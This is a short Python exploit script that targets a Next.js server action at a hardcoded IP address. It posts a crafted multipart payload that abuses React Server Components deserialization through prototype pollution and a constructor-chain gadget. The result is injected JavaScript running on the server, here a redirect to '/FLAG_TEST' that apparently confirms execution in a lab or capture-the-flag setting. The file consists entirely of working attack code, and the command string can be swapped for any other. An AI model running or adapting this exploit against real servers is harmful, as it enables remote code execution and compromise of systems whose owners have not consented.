import urllib.request, uuid

BASE = "http://18.215.143.250:3000"
ACTION_SEARCH = "40881a01be516941afc21e3145707ceff4a34545af"

boundary = "----WebKitFormBoundary" + uuid.uuid4().hex

# Code to execute:
cmd = "throw Object.assign(new Error(), {digest: 'NEXT_REDIRECT;push;/FLAG_TEST;307;'});"

chunk0 = '''{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "_response": {
    "_prefix": "''' + cmd.replace('"', '\\"') + '''//",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  },
  "value": "{\\"then\\":\\"$B0\\"}"
}'''

chunk1 = '"$@0"'

parts = [
    f"--{boundary}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{chunk0}\r\n",
    f"--{boundary}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n{chunk1}\r\n",
    f"--{boundary}--\r\n"
]
body = "".join(parts).encode()

req = urllib.request.Request(
    BASE,
    data=body,
    headers={
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Next-Action': ACTION_SEARCH
    }
)

try:
    with urllib.request.urlopen(req, timeout=10) as resp:
        print('Status:', resp.status)
        print('Headers:', resp.headers)
        print('Body:', resp.read().decode('utf-8', 'replace'))
except urllib.error.HTTPError as e:
    print('HTTPError:', e.code)
    print('Headers:', e.headers)
    print('Body:', e.read().decode('utf-8', 'replace'))
except Exception as e:
    print('Exception:', e)
